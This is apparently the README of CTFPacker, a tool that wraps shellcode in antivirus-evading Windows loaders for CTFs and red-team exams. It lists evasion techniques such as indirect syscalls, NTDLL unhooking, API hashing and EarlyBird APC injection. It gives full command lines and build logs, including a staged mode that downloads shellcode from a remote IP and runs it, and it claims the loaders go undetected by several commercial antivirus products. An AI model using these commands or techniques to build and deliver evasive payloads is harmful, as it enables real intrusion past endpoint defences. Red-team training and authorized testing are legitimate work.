# CTFPacker

```
 ▄████▄  ▄▄▄█████▓  █████▒██▓███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███  
▒██▀ ▀█  ▓  ██▒ ▓▒▓██   ▒▓██░  ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒▓█    ▄ ▒ ▓██░ ▒░▒████ ░▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
▒▓▓▄ ▄██▒░ ▓██▓ ░ ░▓█▒  ░▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒ ▓███▀ ░  ▒██▒ ░ ░▒█░   ▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ░▒ ▒  ░  ▒ ░░    ▒ ░   ▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ░  ▒       ░     ░     ░▒ ░       ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░          ░       ░ ░   ░░         ░   ▒   ░        ░ ░░ ░    ░     ░░   ░ 
░ ░                                     ░  ░░ ░      ░  ░      ░  ░   ░     
░                                           ░                               
```
## Table-Of-Contents

- [CTFPacker](#ctfpacker)
  * [Goal](#goal)
  * [General Information](#general-information)
  * [Evasion Features](#evasion-features)
  * [Installation](#installation)
    + [Makefile](#makefile)
  * [Usage](#usage)
    + [Format option](#format-option)
    + [Staged](#staged)
    + [Stageless](#stageless)
    + [Target Process Injection](#target-process-injection)
  * [Demo](#demo)
  * [To-Do](#to-do)
  * [Detections](#detections)
  * [Credits - References](#credits---references)

## Goal

This repository has been created to facilitate AV evasion during CTFs and/or pentest & red team exams. The goal is to focus more on pwning rather than struggeling with evasion !

Check out my blog post for more infos: [Evade Modern AVs in 2025](https://mochabyte.xyz/posts/Evade-Modern-AVs-in-2025/)

## General Information

>[!CAUTION]
>This tool is designed for authorized operations only. I AM NOT RESPONSIBLE FOR YOUR ACTIONS. DON'T DO BAD STUFF.

>[!NOTE]
>- The techniques used in the loader are nothing new. The loader generated from this packer will probably NOT evade modern AVs / EDRs. Do not expect that or anything ground breaking.
>- Most of the evasion techniques used here are NOT from me. I just added a bunch of known stuff together and it is enough for CTFs !
>- Depending on the interest shown to this project, I might add some techniques from my own research and maybe expand/rewrite the packer entirely.

## Evasion Features

- Indirect Syscalls via Syswhispers (rewrote in NASM compatible assembly)
- API Hashing
- NTDLL unhooking via Known DLLs technique
- Custom GetProcAddr & GetModuleHandle functions
- Custom AES-128-CBC mode encryption & decryption
- EarlyBird APC Injection
- Possiblity to choose between staged or stageless loader
- "Polymorphic" behavior with the `-s` argument

## Installation

Depending on your OS, the installation will slightly differ. In general, make sure you have the following stuff installed:

- CLANG compiler
- MinGW-w64 Toolchain
- Make

If I am not mistaken, those are by default installed on KALI Linux. However, if you want to install them manually, this should do the trick:

```bash
# Assuming Debian based system
sudo apt update
sudo apt install clang pipx mingw-w64 make lld nasm osslsigncode

# Verify installation
clang --version
make --version

# or
clang -v

# If this is the case, refer to the chapter "Makefile" to replace the compiler in the Makefile of the templates
```

It's a bit of a different story on Windows. You need to install the MinGW-w64 toolchain by installing MSYS2 first.

```powershell
# Go there and install this
https://www.msys2.org/

# Then
pacman -Syu
pacman -S mingw-w64-x86_64-clang

# Veryify installation
x86_64-w64-mingw32-clang --version

# Install make
pacman -S make

# Verify installation
make --version
```

You should also check under `C:\msys64\mingw64\bin`. This is a common place where the toolchain is being installed.

After the basis installation, don't forget to install the python requirements ! Otherwise the packer will not work :D !

**Linux**:
```bash
# Via pipx (preferred way)
cd CTFPacker
python3 -m pipx install .
# You can use ctfpacker globaly now

# Via manual virtual environment
cd CTFPacker
python3 -m venv env
source env/bin/activate
python3 -m pip install .

# Once you're done using the tool
deactivate

# Old fashion
cd CTFPacker
python3 -m pip install -r requirements.txt --break-system-packages
python3 main.py -h
```
**Windows**:
```powershell
# Via pip
cd CTFPacker
python3 -m pip install .

# Done ! :)
```

### Makefile

You should NOT modify the Makefile unless you know what you are doing ! BUT, there's one thing you should check BEFORE the python installation process. The first line of the Makefile indicates your compiler. Verify if the compiler matches with the one you installed earlier on your system. You can refer to the appropriate Makefile (windows / linux) in this repo.

```makefile
# Verify this line
CLANG    := clang
```

Replace it with the appropriate CLANG compiler

```makefile
# Example
CLANG    := x86_64-w64-mingw32-clang
```

## Usage

General usage:
```
usage: main.py [-h] {staged,stageless} ...

CTFPacker

positional arguments:
  {staged,stageless}  Staged or Stageless Payloads
    staged            Staged
    stageless         Stageless

options:
  -h, --help          show this help message and exit
```

Staged:

```
usage: main.py staged [-h] -p PAYLOAD [-f {EXE,DLL}] -i IP_ADDRESS -po PORT -pa PATH [-o OUTPUT] [-e] [-s] [-pfx PFX] [-pfx-pass PFX_PASSWORD]

options:
  -h, --help            show this help message and exit
  -p PAYLOAD, --payload PAYLOAD
                        Shellcode to be packed
  -f {EXE,DLL}, --format {EXE,DLL}
                        Format of the output file (default: EXE).
  -i IP_ADDRESS, --ip-address IP_ADDRESS
                        IP address from where your shellcode is gonna be fetched.
  -po PORT, --port PORT
                        Port from where the HTTP connection is gonna fetch your shellcode.
  -pa PATH, --path PATH
                        Path from where your shellcode uis gonna be fetched.
  -o OUTPUT, --output OUTPUT
                        Output path where the shellcode is gonna be saved.
  -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
  -s, --scramble        Scramble the loader's functions and variables.
  -pfx PFX, --pfx PFX   Path to the PFX file for signing the loader.
  -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
                        Password for the PFX file.

Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'
```

Stageless:

```
usage: main.py stageless [-h] -p PAYLOAD [-f {EXE,DLL}] [-e] [-s] [-pfx PFX] [-pfx-pass PFX_PASSWORD]

options:
  -h, --help            show this help message and exit
  -p PAYLOAD, --payload PAYLOAD
                        Shellcode to be packed
  -f {EXE,DLL}, --format {EXE,DLL}
                        Format of the output file (default: EXE).
  -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
  -s, --scramble        Scramble the loader's functions and variables.
  -pfx PFX, --pfx PFX   Path to the PFX file for signing the loader.
  -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
                        Password for the PFX file.

Example usage: python main.py stageless -p shellcode.bin -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'
```

### Format option

In both cases, staged or stageless, you can choose whether to compile your loader as an EXE or a DLL. To compile it as a DLL, simply append `-f DLL`. By default, it compiles as an EXE, though you can also explicitly specify this using -f EXE (but you don't need to).

The DLL version exports a function called `ctf`. This is the function you need to call to start the exection. 

```powershell
rundll32.exe ctfloader.dll,ctf
```

### Staged

When using the staged "mode", the packer will generate you a .bin file named accordingly to your `-o` arg. With the `-pa` argument, you are actually telling the loader *where* on the websever (basically the path) it should search for that .bin file. So TLDR those two values should usually be the same.

Example:

```powershell
python main.py staged -p "C:\Code\CTFPacker\calc.bin" -i 192.168.2.121 -po 8080 -pa /shellcode.bin -o shellcode -s -pfx cert.pfx -pfx-pass Password



 ▄████▄  ▄▄▄█████▓  █████▒██▓███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███
▒██▀ ▀█  ▓  ██▒ ▓▒▓██   ▒▓██░  ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒▓█    ▄ ▒ ▓██░ ▒░▒████ ░▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
▒▓▓▄ ▄██▒░ ▓██▓ ░ ░▓█▒  ░▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄
▒ ▓███▀ ░  ▒██▒ ░ ░▒█░   ▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ░▒ ▒  ░  ▒ ░░    ▒ ░   ▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ░  ▒       ░     ░     ░▒ ░       ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░          ░       ░ ░   ░░         ░   ▒   ░        ░ ░░ ░    ░     ░░   ░
░ ░                                     ░  ░░ ░      ░  ░      ░  ░   ░
░                                           ░



        Author: mocha
        https://mochabyte.xyz

[i] Staged Payload selected.
[+] Starting the process...
[i] Corresponding template selected..
[+] Template files modified !
[i] Encryption not selected.
[+] Compiling the loader...
[i] Scrambling selected.
[+] Scrambling the loader...
[+] Loader scrambled !
[i] Signing selected.
[+] Signing the loader...
rm -f *.o *.obj ctfloader.exe
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -c api_hashing.c -o api_hashing.o
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -c download.c -o download.o
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -c inject.c -o inject.o
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -c main.c -o main.o
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -c unhook.c -o unhook.o
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -c whispers.c -o whispers.o
nasm -f win64   whispers-asm.x64.asm -o whispers-asm.o
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -o ctfloader.exe api_hashing.o download.o inject.o main.o unhook.o whispers.o whispers-asm.o -Wl,--disable-auto-import -s -lwinhttp -lntdll
Connecting to http://timestamp.sectigo.com
Succeeded
[+] Loader signed !
[+] DONE !
```

With this command, your telling the loader to connect to the `192.168.2.121` IP, at port `8080` and download the `shellcode.bin` file. So you should serve this file via a webserver.

```powershell
C:\Code\CTFPacker\CTF Packer>ls
shellcode.bin

C:\Code\CTFPacker\CTF Packer>python -m http.server 8080
Serving HTTP on :: port 8080 (http://[::]:8080/) ...
```

### Stageless

This is fairly simple. The shellcode will be included into the loader. I recommend you to use the encryption arg `-e`. Otherwise the signature-based detection will likely catch it.

```powershell
C:\Code\CTFPacker>ls
core  custom_certs  main.py  requirements.txt templates

C:\Code\CTFPacker>python main.py stageless -p "C:\Code\CTFPacker\calc.bin" -e -s



 ▄████▄  ▄▄▄█████▓  █████▒██▓███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███
▒██▀ ▀█  ▓  ██▒ ▓▒▓██   ▒▓██░  ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒▓█    ▄ ▒ ▓██░ ▒░▒████ ░▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
▒▓▓▄ ▄██▒░ ▓██▓ ░ ░▓█▒  ░▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄
▒ ▓███▀ ░  ▒██▒ ░ ░▒█░   ▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ░▒ ▒  ░  ▒ ░░    ▒ ░   ▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ░  ▒       ░     ░     ░▒ ░       ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░          ░       ░ ░   ░░         ░   ▒   ░        ░ ░░ ░    ░     ░░   ░
░ ░                                     ░  ░░ ░      ░  ░      ░  ░   ░
░                                           ░



        Author: mocha
        https://mochabyte.xyz

[i] Stageless Payload selected.
[+] Starting the process...
[+] Template files modified !
[i] Encryption selected.
[+] Encrypting the payload...
[+] Payload encrypted and saved into payload[] variable in main.c !
[i] Scrambling selected.
[+] Scrambling the loader...
[+] Loader scrambled !
rm -f *.o *.obj ctfloader.exe
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -c api_hashing.c -o api_hashing.o
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -c inject.c -o inject.o
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -c main.c -o main.o
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -c unhook.c -o unhook.o
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -c whispers.c -o whispers.o
nasm -f win64   whispers-asm.x64.asm -o whispers-asm.o
C:\msys64\mingw64\bin\clang -static -O0 -Wall -w -o ctfloader.exe api_hashing.o inject.o main.o unhook.o whispers.o whispers-asm.o -Wl,--disable-auto-import -s -lwinhttp -lntdll
[+] Loader compiled !
[+] DONE !

C:\Code\CTFPacker>ls
core  ctfloader.exe  custom_certs  main.py  requirements.txt  shellcode.bin  templates
```

### Target Process Injection

I won't go into detail about how the EarlyBird APC Injection technique works, but one thing you should know is that it needs to *create* a process. The current target process is `RuntimeBroker.exe`. IF (I encountered that in some HTB Pro Labs) `RuntimeBroker.exe` is NOT present on the system (for whatever reasons), you should change the source code and target another process.

To do that, you can navigate into the `main.c` file (staged or stageless) and modify this value at the top

```c
#define TARGET_PROCESS "RuntimeBroker.exe"
```

You should choose a binary that is present in the `System32` directory. For example, this should also work:

```c
#define TARGET_PROCESS "svchost.exe"
```

I'll probably add some kind of argument in the future for you to choose between a few target processes.

>[!NOTE]
> Be aware that some processes will be easier to detect than others. In my experience, doing the APC Injection into `svchost` for example is more likely to be catched.  

## Demo

https://github.com/user-attachments/assets/4aa56672-bcfb-424b-aa89-a919b514ae35

## To-Do

- [x] Maybe adding a setup.py file to install via pip / pipx
- [ ] Other templates with different injection techniques
- [ ] Adding AMSI / ETW bypass (depends on what injection technique I am going to put here)

## Detections

- Undetected on the latest Windows 11 Defender (2025-03-18, Version 1.425.89.0)
- Undetected on Windows 10 Defender (2025-03-18, Version 1.425.90.0)
- Undetected on the latest Sophos Home Premium (Version 2023.2.2.2)
   ![image](https://github.com/user-attachments/assets/54a5539c-8eb8-490e-a189-33fbf7be9867)
- Undetected on the latest Kasperky Premium (20.06.2025)

## Credits - References

Most of the code is not from me. Here are the original authors:

```
@ Maldevacademy     - https://maldevacademy.com
@ SaadAhla          - https://github.com/SaadAhla/ntdlll-unhooking-collection
@ VX-Underground    - https://github.com/vxunderground/VX-API/blob/main/VX-API/GetProcAddressDjb2.cpp
@ klezVirus         - https://github.com/klezVirus/SysWhispers3
```

